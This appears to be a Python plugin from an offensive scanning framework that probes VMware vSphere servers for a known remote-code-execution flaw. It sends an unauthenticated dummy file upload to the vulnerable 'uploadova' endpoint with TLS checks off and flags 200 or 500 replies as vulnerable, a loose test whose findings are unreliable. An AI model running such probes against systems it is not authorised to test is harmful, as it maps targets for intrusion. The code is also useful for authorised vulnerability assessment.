import requests
from core.printmodels import *

class VSphere_RCE_Exploit:
    def __init__(self):
        self.name = "vSphere RCE"
        self.description = "VMware vSphere Client RCE"
        self.author = "Mrphoenix"

    def Exploit(self, site):
        try:
            headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded"}
            target = f"{site}/ui/vropspluginui/rest/services/uploadova"
            
            files = {
                'uploadFile': ('test.tar', 'test data', 'application/x-tar')
            }
            
            response = requests.post(target, files=files, verify=False, timeout=10)
            
            if response.status_code == 200 or response.status_code == 500:
                return PrintSuccess(f"[vSphere] Potentially vulnerable to RCE!")
            return PrintFailed("[vSphere] Not Vulnerable")
        except Exception as e:
            return PrintError(f"[vSphere] Error: {str(e)}")
